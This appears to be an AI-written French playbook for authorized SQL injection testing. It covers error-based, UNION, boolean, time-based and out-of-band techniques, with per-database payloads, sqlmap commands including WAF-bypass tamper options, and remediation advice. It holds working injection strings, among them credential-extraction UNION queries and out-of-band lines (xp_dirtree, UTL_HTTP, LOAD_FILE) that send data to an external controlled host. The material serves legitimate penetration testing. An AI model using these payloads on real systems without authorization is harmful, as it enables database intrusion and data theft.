# SQL Injection Playbook — Workflow professionnel

> ⚠️ Utiliser **uniquement avec autorisation écrite** (périmètre défini & consenti).
> Références : **PortSwigger Web Security Academy** (détection, UNION, blind, OAST) et **OWASP WSTG** (méthodologie de test). ([PortSwigger][1], [OWASP Foundation][2])

## 0) Préparation

* **Proxy & outils** : Burp Suite (Logger++, Repeater, Intruder), `ffuf/feroxbuster`, `sqlmap`.
* **Carto** : liste des endpoints & paramètres (GET, POST, JSON, headers/cookies).
* **Règle d’or** : privilégier des payloads **non destructifs** et idempotents.

---

## 1) Détection rapide (in-band vs blind)

### 1.1 Sonde minimale

* Sur un **paramètre candidat**, injecte une apostrophe `'` (ou un guillemet `"`) et observe :

  * **Erreur SQL** visible → probabilité **SQLi in-band** (error/UNION).
  * **Aucune erreur, mais différence de contenu** → possible **blind boolean**.
  * **Aucun écart** → teste **time-based** ou **OAST** (out-of-band).
    *(Défs & principes “blind”) ([PortSwigger][3])*

### 1.2 Commentaires & fermetures (selon SGBD)

* **MySQL** : `-- ` (avec espace), `#`, `/* … */`
* **PostgreSQL/SQL Server/Oracle** : `--` et `/* … */`
  *(Voir syntaxes détaillées, concaténation, fonctions) ([PortSwigger][4])*

---

## 2) SQLi **in-band** (error-based & UNION)

### 2.1 Error-based (si messages SQL visibles)

* Provoquer un message exploitable (sans casser l’app) puis **extraire de l’info**.
* Exemples d’empreintes (“fingerprint”) :

  * **MySQL** : `… AND @@version` ou `UNION SELECT version() …`
  * **PostgreSQL** : `… UNION SELECT current_database()`
  * **SQL Server** : `… UNION SELECT @@version`
  * **Oracle** : `… UNION SELECT banner FROM v$version`
    \*(Cheat-sheet & lab guides) ([PortSwigger][4])

> Si l’appli n’affiche pas les erreurs, bascule vers **UNION** ou **blind**.

### 2.2 UNION query — procédure canonique

1. **Trouver le nombre de colonnes**

   * `ORDER BY n` incrémental : `… ORDER BY 1--`, `… ORDER BY 2--` … jusqu’à erreur → **n-1** colonnes.
   * ou **UNION NULL** : `… UNION SELECT NULL--`, puis `NULL,NULL--`, etc., jusqu’à réponse **200 / page stable**. ([PortSwigger][5])
2. **Colonnes affichées (texte)**

   * Place une chaîne tour à tour :

     ```
     ' UNION SELECT 'a',NULL,NULL-- 
     ' UNION SELECT NULL,'a',NULL-- 
     ' UNION SELECT NULL,NULL,'a'--
     ```

     La/les colonne(s) qui **s’affichent** serviront pour dumper les données. ([PortSwigger][6])
3. **Fingerprint & enum**

   * Version/DB courante : `version()`, `current_database()`, `@@version`, `banner …`
   * Lister tables/colonnes via `information_schema` (MySQL/PG/SQLSrv) ou vues Oracle (`all_tables`, `all_tab_columns`).
   * Puis **UNION SELECT** des `username,password` (ou données ciblées).
     \*(Exos & labs PortSwigger sur l’énumération) ([PortSwigger][7])

> **Checklists in-band**
>
> * [ ] Nb colonnes trouvé
> * [ ] Colonne(s) texte identifiée(s)
> * [ ] Version & DB courante
> * [ ] Tables/colonnes sensibles listées
> * [ ] Extraction minimale (PoC) + captures

---

## 3) SQLi **blind** (aucune sortie exploitable)

> **Stratégie** : ① Boolean-based (réponse change), ② Time-based (latence), ③ **OAST** (DNS/HTTP externe) si async / no-feedback. ([PortSwigger][3])

### 3.1 Boolean-based (différence de contenu)

* **Test booléen** :

  * Vrai : `… AND 1=1--` ; Faux : `… AND 1=2--` → comparer gabarit/rendu.
* **Exfiltration bit-à-bit** (binaire / bisection) :

  * MySQL : `AND ASCII(SUBSTRING((SELECT database()),1,1))>77--`
  * PostgreSQL : `AND ASCII(SUBSTRING((SELECT current_database()),1,1))>77--`
  * SQL Server : `AND ASCII(SUBSTRING(DB_NAME(),1,1))>77--`
  * Oracle : `AND ASCII(SUBSTR((SELECT ora_database_name FROM dual),1,1))>77--`
* Appliquer **recherche dichotomique** caractère par caractère.
  \*(Concepts & lab “conditional responses”) ([PortSwigger][8], [Invicti][9])

### 3.2 Time-based (différences de temps)

* Utiliser une **fonction de délai** pour déduire Vrai/Faux par latence :

  * **MySQL** : `SLEEP(5)`
  * **PostgreSQL** : `pg_sleep(5)`
  * **SQL Server** : `WAITFOR DELAY '0:0:5'`
  * **Oracle** : `dbms_pipe.receive_message('a',5)`
    Ex. : `… AND IF(ASCII(SUBSTRING(version(),1,1))>77,SLEEP(5),0)--`
    \*(Tutoriels/Labs time-based) ([PortSwigger][10])

### 3.3 OAST / Out-of-Band (quand l’app ne “répond” pas)

* **Principe** : déclencher une **requête externe** (DNS/HTTP) vers un domaine que vous contrôlez (ex. **Burp Collaborator**) pour prouver l’injection et **exfiltrer**. ([PortSwigger][11])
* **Techniques fréquentes (selon SGBD & droits)** :

  * **SQL Server (Windows)** : `; EXEC master..xp_dirtree '\\<collab-id>\\a'--` (déclenche SMB/DNS). ([redsiege.com][12])
  * **Oracle** : `UTL_HTTP.REQUEST('http://<collab-id>')` ou `DBMS_LDAP.INIT(...)`. ([InfoSec Write-ups][13])
  * **MySQL (Windows)** : `LOAD_FILE('\\\\<collab-id>\\a')` peut causer une résolution réseau (selon config). ([Exploit Database][14])
* **Cas d’usage** : les requêtes SQL sont **asynchrones** (pas d’effet sur la page), **OAST** devient la seule voie fiable. ([PortSwigger][15])

> **Checklists blind**
>
> * [ ] Point d’injection stabilisé
> * [ ] Méthode (boolean/time/OAST) choisie
> * [ ] Payload d’extraction (version/DB) validé
> * [ ] Script d’automatisation (bisection) prêt

---

## 4) Arbre de décision (résumé)

1. **Erreur visible ?**
   → Oui : **Error/UNION** → nb colonnes → colonnes texte → enum. ([PortSwigger][6])
   → Non :
2. **Différence de contenu ?** (Welcome/compteur/longueur)
   → Oui : **Boolean-based** (dichotomie). ([PortSwigger][8])
   → Non :
3. **Latence mesurable ?**
   → Oui : **Time-based** (SLEEP/WAITFOR/pg\_sleep). ([PortSwigger][10])
   → Non / Async :
4. **OAST** (Burp Collaborator / DNS/HTTP externe). ([PortSwigger][11])

---

## 5) Payloads de base par SGBD (mémo rapide)

| Objectif     | MySQL             | PostgreSQL                                      | SQL Server              | Oracle                             |
| ------------ | ----------------- | ----------------------------------------------- | ----------------------- | ---------------------------------- |
| Version      | `version()`       | `version()`/`current_setting('server_version')` | `@@version`             | `banner FROM v$version`            |
| DB courante  | `database()`      | `current_database()`                            | `DB_NAME()`             | `ora_database_name FROM dual`      |
| Time delay   | `SLEEP(5)`        | `pg_sleep(5)`                                   | `WAITFOR DELAY '0:0:5'` | `dbms_pipe.receive_message('a',5)` |
| Substr/ASCII | `SUBSTRING/ASCII` | `SUBSTRING/ASCII`                               | `SUBSTRING/ASCII`       | `SUBSTR/ASCII`                     |

\*(Syntaxes & variantes : PortSwigger **SQLi Cheat Sheet**.) ([PortSwigger][4])

---

## 6) Automatisation raisonnée (sqlmap)

* **Fingerprint & test multi-techniques** :

  ```bash
  sqlmap -u "https://target/item.php?id=1" -p id --risk=2 --level=2 --technique=BEUSTQ --fingerprint
  ```

  * `--technique=BEUSTQ` = **B**oolean, **E**rror, **U**NION, **S**tacked, **T**ime, **Q**uery-inline.
  * `--fingerprint` : identification du SGBD/version. ([GitHub][16], [highon.coffee][17])
* **Pilotage précis** : `-p param`, `--cookie`, `--data` (POST/JSON), `--tamper` (bypass WAF), `--delay/--timeout` pour time-based. ([Vaadata][18])

> *Astuce pro* : commence **manuel** (compréhension & propreté des preuves), puis **sqlmap** pour accélérer l’énumération.

---

## 7) Qualité du rapport

* **Reproduction** : chaque étape avec **requêtes brutes**, captures Burp, et **conditions de succès**.
* **Impact** : données atteintes, périmètre, pivot possible.
* **Remédiations** : préparation de requêtes paramétrées, ORM, **Least Privilege**, masquage d’erreurs, WAF en défense **complémentaire** (pas principale). *(OWASP WSTG & PortSwigger, définitions & bonnes pratiques de test) ([OWASP Foundation][2], [PortSwigger][1])*

---

## 8) Check-list “prête à l’emploi”

* [ ] Cartographie params (incl. cookies/headers, JSON body)
* [ ] Tests `'` + commentaires & fermetures
* [ ] **In-band** : `ORDER BY` / `UNION NULL` → nb colonnes → colonne affichée → enum
* [ ] **Blind** : boolean (diff contenu) → time (latence) → OAST (DNS/HTTP)
* [ ] Fingerprint SGBD + version
* [ ] **PoC non destructif** + preuves
* [ ] Rapport clair + remédiations

---

### Annexes (références utiles)

* **PortSwigger** : intro SQLi, UNION, blind (boolean/time), **OAST/Collaborator**. ([PortSwigger][1])
* **OWASP WSTG** : Testing for SQL Injection & chapitres SGBD-spécifiques. ([OWASP Foundation][2])

---

Si tu veux, je peux te **packager ça en fichier Markdown** avec un sommaire cliquable et un petit schéma ASCII d’arbre de décision prêt à push sur ton repo.

[1]: https://portswigger.net/web-security/sql-injection? "What is SQL Injection? Tutorial & Examples | Web Security"
[2]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection? "Testing for SQL Injection"
[3]: https://portswigger.net/web-security/sql-injection/blind? "What is Blind SQL Injection? Tutorial & Examples"
[4]: https://portswigger.net/web-security/sql-injection/cheat-sheet? "SQL injection cheat sheet | Web Security Academy"
[5]: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns? "Lab: SQL injection UNION attack, determining the number ..."
[6]: https://portswigger.net/web-security/sql-injection/union-attacks? "SQL injection UNION attacks | Web Security Academy"
[7]: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle? "SQL injection attack, listing the database contents on Oracle"
[8]: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses? "Lab: Blind SQL injection with conditional responses"
[9]: https://www.invicti.com/learn/blind-sql-injection/? "Blind SQL Injection"
[10]: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval? "Blind SQL injection with time delays and information retrieval"
[11]: https://portswigger.net/burp/application-security-testing/oast? "Out-of-Band Application Security Testing (OAST) Software"
[12]: https://redsiege.com/tools-techniques/2018/09/capturing-sql-server-user-hash-with-sqli/?  "Capturing SQL Server User Hash with SQLi"
[13]: https://infosecwriteups.com/out-of-band-oob-sql-injection-87b7c666548b?  "Out-of-Band (OOB) SQL Injection"
[14]: https://www.exploit-db.com/docs/english/41273-mysql-out-of-band-hacking.pdf?  "MySQL Out-of-Band Hacking"
[15]: https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band?  "Lab: Blind SQL injection with out-of-band interaction"
[16]: https://github.com/sqlmapproject/sqlmap/wiki/Techniques?  "Techniques · sqlmapproject/sqlmap Wiki"
[17]: https://highon.coffee/blog/sqlmap-cheat-sheet/?  "SQLMap Cheat Sheet: Flags & Commands for SQL Injection"
[18]: https://www.vaadata.com/blog/exploiting-an-sql-injection-with-waf-bypass/?  "Exploiting an SQL injection with WAF bypass - Vaadata"
